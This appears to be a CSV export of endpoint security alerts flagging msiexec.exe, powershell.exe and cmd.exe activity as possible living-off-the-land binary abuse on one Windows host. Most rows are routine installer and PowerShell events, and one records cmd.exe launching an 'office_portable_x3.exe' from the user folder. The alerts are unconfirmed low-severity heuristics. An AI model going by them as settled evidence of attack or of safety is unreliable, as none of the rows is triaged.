"Jun 1, 2026 @ 14:21:38.811",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIEF4B.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-617EAB3A
"Jun 1, 2026 @ 14:21:38.615",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"12,192",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B5284896
"Jun 1, 2026 @ 14:23:13.509",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-CBAE6587
"Jun 1, 2026 @ 14:23:13.508",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_0wjj1ugx.yy3.ps1,,creation,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-7EE42FA5
"Jun 1, 2026 @ 14:23:13.506",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-64FD4449
"Jun 1, 2026 @ 14:23:13.499",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F9A19FDB
"Jun 1, 2026 @ 14:23:13.491",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-EA1D79AD
"Jun 1, 2026 @ 14:23:13.464",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-75BE1E3D
"Jun 1, 2026 @ 14:23:13.450",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-87EFB1CB
"Jun 1, 2026 @ 14:23:13.448",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9B62392D
"Jun 1, 2026 @ 14:21:38.537",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIEF4B.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-D11C00FC
"Jun 1, 2026 @ 14:21:38.223",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIED95.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-73A7549E
"Jun 1, 2026 @ 14:21:38.218",C:\Windows\SysWOW64\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"37,284",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-537ACA17
"Jun 1, 2026 @ 14:21:38.092",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIED95.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-16C3C66A
"Jun 1, 2026 @ 14:21:37.955",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-02EE41BB
"Jun 1, 2026 @ 14:21:40.970",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\15bcee43.rbs,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A59D41CF
"Jun 1, 2026 @ 14:21:40.962",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF7BC.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E3B16541
"Jun 1, 2026 @ 14:21:40.687",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF7BC.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E45497FD
"Jun 1, 2026 @ 14:21:40.684",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF47F.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-FF4ECBB4
"Jun 1, 2026 @ 14:21:39.867",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF47F.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-ECFB5711
"Jun 1, 2026 @ 14:21:39.865",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF45F.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-52BBF30F
"Jun 1, 2026 @ 14:21:39.861",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"12,192",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-232A1B80
"Jun 1, 2026 @ 14:21:39.826",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF45F.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-429D93FF
"Jun 1, 2026 @ 14:21:39.824",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF42F.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-CF77B52F
"Jun 1, 2026 @ 14:21:39.821",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"12,192",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-404A262C
"Jun 1, 2026 @ 14:21:39.789",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF42F.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-1A1D84D1
"Jun 1, 2026 @ 14:23:13.705",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E0602B4B
"Jun 1, 2026 @ 14:23:13.594",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-0DD40C87
"Jun 1, 2026 @ 14:23:13.591",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F338A860
"Jun 1, 2026 @ 14:23:13.554",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-CF20BB6C
"Jun 1, 2026 @ 14:23:13.545",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_sglt0ecp.xyy.psm1,,deletion,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-816B1BA8
"Jun 1, 2026 @ 14:23:13.542",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_0wjj1ugx.yy3.ps1,,deletion,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-7C6B33FF
"Jun 1, 2026 @ 14:23:13.529",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9E2FD0F7
"Jun 1, 2026 @ 14:23:13.512",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_sglt0ecp.xyy.psm1,,creation,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A7058274
"Jun 1, 2026 @ 14:23:12.276",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-BEAB64E1
"Jun 1, 2026 @ 14:23:12.256",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-D6352A91
"Jun 1, 2026 @ 14:23:12.140",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,overwrite,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F6AE60ED
"Jun 1, 2026 @ 14:23:13.444",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-51D2BC2D
"Jun 1, 2026 @ 14:23:13.426",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-7951E899
"Jun 1, 2026 @ 14:23:13.314",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,overwrite,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-65F33CA8
"Jun 1, 2026 @ 14:23:13.178",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-41DAAF76
"Jun 1, 2026 @ 14:23:13.172",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C9A3F4AC
"Jun 1, 2026 @ 14:23:13.157",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B0FFFDF6
"Jun 1, 2026 @ 14:23:12.552",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-715C73BF
"Jun 1, 2026 @ 14:23:12.431",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C5E41817
"Jun 1, 2026 @ 14:23:12.427",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F41DECBD
"Jun 1, 2026 @ 14:23:12.379",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-668B8B99
"Jun 1, 2026 @ 14:23:12.368",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_nqu2ntqj.lvi.psm1,,deletion,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-8C4298AD
"Jun 1, 2026 @ 14:21:39.777",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF0C3.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-D6471651
"Jun 1, 2026 @ 14:21:42.914",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIFDF9.tmp,,overwrite,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-889BCE95
"Jun 1, 2026 @ 14:21:42.181",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIFB97.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-39395D50
"Jun 1, 2026 @ 14:21:41.803",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"25,464",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C52F95D6
"Jun 1, 2026 @ 14:21:41.673",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIFB97.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-29CDBFC8
"Jun 1, 2026 @ 14:21:41.368",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF9FF.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-151E1CE0
"Jun 1, 2026 @ 14:21:41.365",C:\Windows\SysWOW64\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"22,992",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C33B0D48
"Jun 1, 2026 @ 14:21:41.262",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIF9FF.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DBF9AA01
"Jun 1, 2026 @ 14:21:40.995",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\inprogressinstallinfo.ipi,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-CE7371C3
"Jun 1, 2026 @ 14:21:44.227",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSI485.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A7FD5AB4
"Jun 1, 2026 @ 14:21:43.947",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSI485.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-74A43D88
"Jun 1, 2026 @ 14:21:43.944",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSI213.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-51EC1479
"Jun 1, 2026 @ 14:21:43.328",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSI213.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-CB5B4025
"Jun 1, 2026 @ 14:21:43.326",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSI1E3.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-6D4DDE0A
"Jun 1, 2026 @ 14:21:43.322",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"25,464",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-6ADD96FD
"Jun 1, 2026 @ 14:21:43.290",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSI1E3.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-BC9834DC
"Jun 1, 2026 @ 14:23:10.935",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E904AA96
"Jun 1, 2026 @ 14:23:10.877",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C19D85FB
"Jun 1, 2026 @ 14:23:10.862",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_qc1sd1u2.15i.psm1,,deletion,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DB137CCC
"Jun 1, 2026 @ 14:23:10.859",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_yy12yq4k.lwe.ps1,,deletion,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-2B25B609
"Jun 1, 2026 @ 14:23:10.831",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_yy12yq4k.lwe.ps1,,creation,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-C6C9308A
"Jun 1, 2026 @ 14:23:10.808",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-289A648C
"Jun 1, 2026 @ 14:23:10.805",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E4A31BCF
"Jun 1, 2026 @ 14:23:10.801",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E942346A
"Jun 1, 2026 @ 14:23:10.791",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B649CECC
"Jun 1, 2026 @ 14:23:12.366",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_nbmrvwln.k5p.ps1,,deletion,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-FF4ACC35
"Jun 1, 2026 @ 14:23:12.361",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-745B4BFE
"Jun 1, 2026 @ 14:23:12.336",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-6C823A1F
"Jun 1, 2026 @ 14:23:12.331",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-5D759A95
"Jun 1, 2026 @ 14:23:12.293",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-D7E6C848
"Jun 1, 2026 @ 14:23:12.281",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-1990FDCB
"Jun 1, 2026 @ 14:23:12.279",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-A35C9BCE
"Jun 1, 2026 @ 14:23:10.735",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-58419245
"Jun 1, 2026 @ 14:23:10.729",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-93EB7405
"Jun 1, 2026 @ 14:23:10.706",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-99A17D98
"Jun 1, 2026 @ 14:23:04.480",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Windows\system32\cmd.exe"" /c ""C:\Users\DELL\office_portable_x3.exe""",LOLBin Abuse,25,Living-off-the-land binary: cmd.exe,,,,,,start,"24,236",T1059.003,Windows Command Shell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-001E4171
"Jun 1, 2026 @ 14:22:58.472",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,overwrite,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-ABDFF352
"Jun 1, 2026 @ 14:22:56.643",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-FC1B2B89
"Jun 1, 2026 @ 14:22:56.022",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-98206B71
"Jun 1, 2026 @ 14:22:55.868",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-64E13B31
"Jun 1, 2026 @ 14:22:55.246",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,,,modification,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-89BA8DB7
"Jun 1, 2026 @ 14:22:55.242",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,,,modification,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DC91E538
"Jun 1, 2026 @ 14:22:55.239",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,,,modification,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F83FA1A8
"Jun 1, 2026 @ 14:23:11.860",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-90E1A8AC
